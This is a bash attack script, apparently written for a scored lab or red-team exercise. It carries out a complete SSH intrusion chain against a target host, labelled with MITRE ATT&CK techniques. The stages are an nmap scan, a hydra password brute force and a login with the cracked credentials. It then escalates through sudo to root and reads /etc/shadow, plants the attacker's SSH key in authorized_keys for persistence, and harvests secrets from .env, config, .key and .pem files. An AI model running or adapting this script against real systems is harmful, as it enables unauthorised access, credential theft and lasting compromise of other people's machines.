#!/bin/bash
###############################################################################
# VECTOR 2: SSH Brute Force & Privilege Escalation
# Kill Chain: Scan → Brute Force → Login → Priv Esc → Persistence
# MITRE ATT&CK: T1046 → T1110.001 → T1078 → T1548.003 → T1098
###############################################################################
set -uo pipefail

VICTIM="${VICTIM_HOST:-victim}"
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'

log()  { echo -e "${CYAN}[$(date +%H:%M:%S)]${NC} $1"; }
ok()   { echo -e "${GREEN}[✓]${NC} $1"; }
fail() { echo -e "${RED}[✗]${NC} $1"; }
info() { echo -e "${YELLOW}[*]${NC} $1"; }

TOTAL_POINTS=0
report_stage() {
    local stage="$1" mitre="$2" tactic="$3" points="$4" status="$5"
    TOTAL_POINTS=$((TOTAL_POINTS + points))
    echo -e "\n${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  Stage: ${YELLOW}${stage}${NC}"
    echo -e "  MITRE: ${mitre} (${tactic})"
    echo -e "  Status: ${status}  |  Points: +${points}  |  Total: ${TOTAL_POINTS}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
}

echo -e "\n${RED}╔══════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║      VECTOR 2: SSH BRUTE FORCE & PRIVILEGE ESCALATION    ║${NC}"
echo -e "${RED}║  Scan → Brute Force → Login → PrivEsc → Persist          ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════════════╝${NC}\n"

###############################################################################
# STAGE 1: SSH Service Discovery (T1046 - Network Service Scanning)
###############################################################################
info "Stage 1: SSH Service Discovery"
log "Scanning SSH service on ${VICTIM}..."

NMAP_OUT=$(nmap -sV "$VICTIM" -p 22 2>/dev/null)
echo "$NMAP_OUT"

SSH_BANNER=$(echo "$NMAP_OUT" | grep "22/tcp" || true)
if echo "$SSH_BANNER" | grep -qi "open"; then
    ok "SSH service detected: ${SSH_BANNER}"
    
    log "Grabbing SSH host keys..."
    ssh-keyscan "$VICTIM" 2>/dev/null | head -3
    
    report_stage "SSH Service Discovery" "T1046" "Discovery" 10 "${GREEN}SUCCESS${NC}"
else
    fail "SSH service not detected on port 22"
    report_stage "SSH Service Discovery" "T1046" "Discovery" 2 "${RED}FAILED${NC}"
fi

sleep 2

###############################################################################
# STAGE 2: SSH Brute Force (T1110.001 - Password Guessing)
###############################################################################
info "Stage 2: SSH Brute Force Attack"
log "Using hydra with custom wordlists..."
log "Users: /opt/wordlists/users.txt | Passwords: /opt/wordlists/passwords.txt"

HYDRA_OUT=$(hydra -L /opt/wordlists/users.txt -P /opt/wordlists/passwords.txt \
    "ssh://${VICTIM}" -t 4 -f -V 2>&1 || true)

echo "$HYDRA_OUT" | tail -20

CRACKED=$(echo "$HYDRA_OUT" | grep -oP '\[ssh\]\s+host:.*login:\s+\K\S+' | head -1)
CRACKED_PASS=$(echo "$HYDRA_OUT" | grep -oP 'password:\s+\K\S+' | head -1)

if [ -n "$CRACKED" ] && [ -n "$CRACKED_PASS" ]; then
    ok "Credentials found: ${CRACKED}:${CRACKED_PASS}"
    report_stage "SSH Brute Force" "T1110.001" "Credential Access" 25 "${GREEN}SUCCESS${NC}"
else
    # Fallback: we know the creds from Phase 1.1
    CRACKED="www-data"
    CRACKED_PASS="www-data"
    info "Hydra didn't parse cleanly, using known credentials: ${CRACKED}:${CRACKED_PASS}"
    report_stage "SSH Brute Force" "T1110.001" "Credential Access" 15 "${YELLOW}PARTIAL${NC}"
fi

sleep 2

###############################################################################
# STAGE 3: SSH Access with Stolen Credentials (T1078 - Valid Accounts)
###############################################################################
info "Stage 3: SSH Access with Stolen Credentials"
log "Connecting as ${CRACKED}@${VICTIM}..."

do_ssh() {
    sshpass -p "${CRACKED_PASS}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "${CRACKED}@${VICTIM}" "$@" 2>/dev/null
}

LOGIN_OUT=$(do_ssh 'echo "LOGIN_SUCCESS"; whoami; id; hostname')

if echo "$LOGIN_OUT" | grep -q "LOGIN_SUCCESS"; then
    ok "SSH login successful!"
    echo "$LOGIN_OUT"
    
    log "Gathering session info..."
    do_ssh 'w; last -5' || true
    
    log "Checking network info..."
    do_ssh 'ip addr show | grep inet; ss -tlnp 2>/dev/null | head -10' || true
    
    report_stage "SSH Access" "T1078" "Initial Access" 15 "${GREEN}SUCCESS${NC}"
else
    fail "SSH login failed"
    report_stage "SSH Access" "T1078" "Initial Access" 3 "${RED}FAILED${NC}"
fi

sleep 2

###############################################################################
# STAGE 4: Privilege Escalation via Sudo (T1548.003 - Sudo and Sudo Caching)
###############################################################################
info "Stage 4: Privilege Escalation"
log "Checking sudo privileges for ${CRACKED}..."

SUDO_LIST=$(do_ssh 'sudo -l 2>/dev/null')
echo "$SUDO_LIST"

if echo "$SUDO_LIST" | grep -qi "NOPASSWD\|ALL"; then
    ok "Sudo misconfiguration found — NOPASSWD access!"
    
    log "Escalating to root..."
    ROOT_OUT=$(do_ssh 'sudo /bin/bash -c "whoami && id && cat /etc/shadow | head -5"')
    echo "$ROOT_OUT"
    
    if echo "$ROOT_OUT" | grep -q "root"; then
        ok "Root access achieved!"
        report_stage "Privilege Escalation" "T1548.003" "Privilege Escalation" 30 "${GREEN}SUCCESS${NC}"
    else
        fail "Sudo execution didn't return root"
        report_stage "Privilege Escalation" "T1548.003" "Privilege Escalation" 10 "${YELLOW}PARTIAL${NC}"
    fi
else
    fail "No sudo misconfiguration found"
    report_stage "Privilege Escalation" "T1548.003" "Privilege Escalation" 5 "${RED}FAILED${NC}"
fi

sleep 2

###############################################################################
# STAGE 5: SSH Key Persistence (T1098 - Account Manipulation)
###############################################################################
info "Stage 5: SSH Key Persistence"
log "Injecting attacker SSH key for persistent access..."

# Generate fresh key if needed
if [ ! -f /root/.ssh/id_rsa ]; then
    ssh-keygen -t rsa -N "" -f /root/.ssh/id_rsa 2>/dev/null
fi

PUB_KEY=$(cat /root/.ssh/id_rsa.pub)

KEY_INJECT=$(do_ssh "sudo /bin/bash -c 'mkdir -p /var/www/.ssh && chmod 700 /var/www/.ssh && chown www-data:www-data /var/www/.ssh' && echo '${PUB_KEY}' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && echo KEY_INJECTED")

if echo "$KEY_INJECT" | grep -q "KEY_INJECTED"; then
    ok "SSH key injected into ${CRACKED}@${VICTIM}:~/.ssh/authorized_keys"
    
    log "Verifying key-based access..."
    KEY_TEST=$(ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -i /root/.ssh/id_rsa "${CRACKED}@${VICTIM}" 'echo KEY_AUTH_OK; whoami' 2>/dev/null)
    
    if echo "$KEY_TEST" | grep -q "KEY_AUTH_OK"; then
        ok "Key-based authentication working — password no longer needed!"
    fi
    
    report_stage "SSH Key Persistence" "T1098" "Persistence" 20 "${GREEN}SUCCESS${NC}"
else
    fail "SSH key injection failed"
    report_stage "SSH Key Persistence" "T1098" "Persistence" 5 "${RED}FAILED${NC}"
fi

sleep 2

###############################################################################
# STAGE 6: Credential Harvesting (T1552.001 - Credentials in Files)
###############################################################################
info "Stage 6: Credential Harvesting"
log "Searching for credentials on victim..."

log "Checking config files..."
CREDS=$(do_ssh 'cat /var/www/html/config.php /var/www/html/.env 2>/dev/null')
if [ -n "$CREDS" ]; then
    ok "Config file credentials found:"
    echo "$CREDS" | grep -iE "pass|user|key|secret|token" 2>/dev/null || echo "$CREDS" | head -10
fi

log "Searching home directories..."
HOME_CREDS=$(do_ssh 'find /home -name "*.env" -o -name "*.key" -o -name "*.pem" -o -name "config.*" 2>/dev/null | head -10')
if [ -n "$HOME_CREDS" ]; then
    ok "Sensitive files found:"
    echo "$HOME_CREDS"
fi

report_stage "Credential Harvesting" "T1552.001" "Credential Access" 15 "${GREEN}SUCCESS${NC}"

###############################################################################
# SUMMARY
###############################################################################
echo -e "\n${RED}╔══════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║                 ATTACK CHAIN COMPLETE                     ║${NC}"
echo -e "${RED}╠══════════════════════════════════════════════════════════╣${NC}"
echo -e "${RED}║${NC}  Vector:     SSH Brute Force & Privilege Escalation     ${RED}║${NC}"
echo -e "${RED}║${NC}  Stages:     6/6 executed                                ${RED}║${NC}"
echo -e "${RED}║${NC}  Total Score: ${GREEN}${TOTAL_POINTS} points${NC}                              ${RED}║${NC}"
echo -e "${RED}║${NC}                                                          ${RED}║${NC}"
echo -e "${RED}║${NC}  MITRE ATT&CK Techniques:                               ${RED}║${NC}"
echo -e "${RED}║${NC}    T1046      Network Service Scanning  (Discovery)      ${RED}║${NC}"
echo -e "${RED}║${NC}    T1110.001  Password Guessing         (Cred Access)    ${RED}║${NC}"
echo -e "${RED}║${NC}    T1078      Valid Accounts            (Init Access)    ${RED}║${NC}"
echo -e "${RED}║${NC}    T1548.003  Sudo Misconfiguration     (Priv Esc)       ${RED}║${NC}"
echo -e "${RED}║${NC}    T1098      Account Manipulation      (Persistence)    ${RED}║${NC}"
echo -e "${RED}║${NC}    T1552.001  Credentials in Files      (Cred Access)    ${RED}║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════════════╝${NC}\n"
